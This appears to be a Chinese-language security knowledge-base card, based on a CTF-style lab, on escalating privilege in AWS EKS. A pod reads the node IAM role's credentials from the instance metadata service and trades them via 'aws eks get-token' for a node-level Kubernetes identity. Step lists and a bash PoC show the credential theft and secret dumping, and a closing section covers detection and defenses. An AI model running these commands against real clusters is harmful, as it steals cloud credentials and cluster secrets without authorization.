---
id: cloud-k8s-eks-node-role-get-token-privesc
title: EKS Pod 内直读 IMDS 节点 IAM 角色，用 aws eks get-token 换取节点级 Kubernetes 身份
type: scenario
domain: cloud
path: cloud/k8s
technique: eks-imds-node-role-get-token
tags:
- kubernetes
- eks
- aws
- imds
- iam
- token
- privilege-escalation
- cloud-metadata
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V623
  verified_at: '2026-11-12T22:04:05+08:00'
  notes: 已对照原文与全部14张截图核对：图03 为 Pod 内 curl IMDS /latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole 取得 AccessKeyId/SecretAccessKey/SessionToken；图05 为 aws eks get-token（错误集群名可返回 token 但无法利用）；图06 为 kubectl auth can-i --list --token 显示 serviceaccounts/token create[debug-sa]、secrets get/list 等；图07 为 kubectl get secrets 读取 challenge4 node-flag。卡片综合 Challenge 3 的 IMDS 取节点角色凭据与 Challenge 4 的 get-token→节点 K8s 身份，两段均在原文执行且 aws sts get-caller-identity 确认为同一 NodeInstanceRole，非理论拼接。与既有 cloud-k8s-workload-compromise-identity-expansion-privileged-pod 为完整身份链转述、未给 get-token 机制，本卡为原子手法，非同链；dedup recommendation=new、dup-scan 无配对。修正：将'往往能看到 secrets/pods/serviceaccounts-token'改为案例枚举表述并注明默认 system:nodes 权限较小、取决于 aws-auth。无 affected_versions。未独立复现。
url: /docs/cloud/k8s/cloud-k8s-eks-node-role-get-token-privesc/
draft: false
kb_aliases:
- EKS get-token 提权
- k8s-aws-v1 token
- 节点实例角色换 K8s 权限
- IMDS 节点角色 EKS
- EKS aws-auth 节点身份
---

## 一句话结论

在 EKS 的 Pod 里可以直接访问 IMDS（169.254.169.254）拿到节点实例角色的临时 AWS 凭据；用该凭据执行 `aws eks get-token --cluster-name <名称>` 生成 `k8s-aws-v1` bearer token，kubectl 会以节点 IAM 身份通过 aws-iam-authenticator 认证，从而继承 aws-auth 中映射给节点角色的 Kubernetes 权限（通常远大于普通 Pod 的 ServiceAccount）。

## 原理

- **Pod 到节点身份**：EKS 节点是 EC2 实例并绑定 NodeInstanceRole；Pod 默认可访问 IMDS（除非启用 IMDSv2 hop limit=1 或网络策略阻断），`/latest/meta-data/iam/security-credentials/<role>` 直接返回 `AccessKeyId/SecretAccessKey/SessionToken`。
- **aws eks get-token 的认证机制**：命令用当前 AWS 身份对 STS `GetCallerIdentity` 请求做 SigV4 预签名，把预签名 URL base64url 编码为 `k8s-aws-v1.<...>` token；EKS 的 aws-iam-authenticator 校验该 URL 的签名与身份，再把 IAM 身份映射到 `aws-auth` ConfigMap 中的 Kubernetes 用户/组。
- **节点角色映射**：EKS 默认把节点实例角色加入 `system:bootstrappers` 与 `system:nodes` 组；节点需要这些权限管理 Pod 状态，实践中常附带更多读权限。攻击者以节点身份调用 apiserver 后，用 `kubectl auth can-i --list` 枚举实际 RBAC；案例中该身份可 get/list secrets、pods，并对 `debug-sa` create `serviceaccounts/token`（默认 `system:nodes` 权限较小，实际范围取决于 aws-auth/附加 ClusterRole）。
- **与 SA 权限的差异**：Pod 的 ServiceAccount 可能毫无权限，但节点角色在 aws-auth 中的映射不受命名空间 Role 限制，形成从 Pod 到集群级的身份跃迁。
- 集群名称是唯一额外信息：`aws eks list-clusters` 可能被拒；名称可从环境变量、镜像、文档、域名或盲猜获得。错误集群名得到的 token 无法通过目标集群认证。

## 触发条件

- 攻击者已在 EKS Pod 内取得命令执行。
- Pod 可访问 IMDS 且节点绑定了 IAM 角色（EKS 节点默认如此）。
- 目标集群 aws-auth 将节点角色映射到具有实际 RBAC 权限的组/用户（EKS 默认即 `system:nodes`，且案例中权限更大）。
- 能获知或猜出集群名称。

## 利用步骤

1. 确认当前 AWS 身份（若已有环境变量或可通过 IMDS 配置）：
   `aws sts get-caller-identity` → 看到 `assumed-role/<cluster>-nodegroup-NodeInstanceRole/i-xxx`。
2. 读取 IMDS 节点角色临时凭据：
   `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`。
3. 导出 `AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`。
4. 生成 EKS token：
   `aws eks get-token --cluster-name <cluster>`（输出 ExecCredential JSON，取 `status.token`）。
5. 用 token 调用 apiserver 枚举权限并读取资源：
   `kubectl auth can-i --list --token="$TOKEN" --server=<apiserver>`；
   `kubectl get secrets -o yaml --token="$TOKEN"`。
6. 若节点权限不足，再结合 `serviceaccounts/token create` 或特权 Pod 等路径继续扩张。

## PoC

```bash
# 1) 节点角色名与临时凭据（IMDS）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole

# 2) 导出凭据
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
aws sts get-caller-identity

# 3) 换取 K8s token
TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster | jq -r '.status.token')

# 4) 以节点身份枚举权限/读 Secret
kubectl auth can-i --list --token="$TOKEN"
kubectl get secrets -o yaml --token="$TOKEN"
```

## 变体与关联

- 变体：Pod 配了 IRSA（SA 注解 IAM 角色）时，可用 SA 的 web identity token 换取该角色，而非节点角色（见 OIDC 卡）。
- 变体：`aws eks update-kubeconfig` 生成 kubeconfig 后直接用 kubectl，效果相同。
- 关联：[[cloud-metadata-ssrf-imdsv2-token-credential]]（经 SSRF 而非 Pod 内直连的 IMDS 凭据路径）、[[cloud-k8s-workload-compromise-identity-expansion-privileged-pod]]（节点身份后的 TokenRequest/特权 Pod 扩张）、[[cloud-k8s-eks-oidc-sa-token-assume-role]]（SA→AWS 角色方向）。
- 边界：IMDS 被 hop limit 限制为 1 且 Pod 网络无法访问；节点角色未在 aws-auth 映射或权限被收紧；集群开启 EKS Access Entry 且节点角色无关联策略。

## 检测与防御

- 网络：限制 Pod 访问 IMDS（NetworkPolicy 阻断 169.254.169.254，或节点设 IMDS hop limit=1）；优先使用 IRSA 而不是节点角色。
- IAM：节点角色保持最小权限（只保留 EKS 节点必需策略）；定期审计 aws-auth 与 EKS Access Entry 的映射。
- 检测：Pod IP 访问 IMDS 安全凭据路径；随后出现 `aws eks get-token` 或从 Pod 网络调用 apiserver 且 User-Agent 为 kubectl、身份为节点角色的行为；CloudTrail 中 `GetCallerIdentity`/`AssumeRole` 异常。
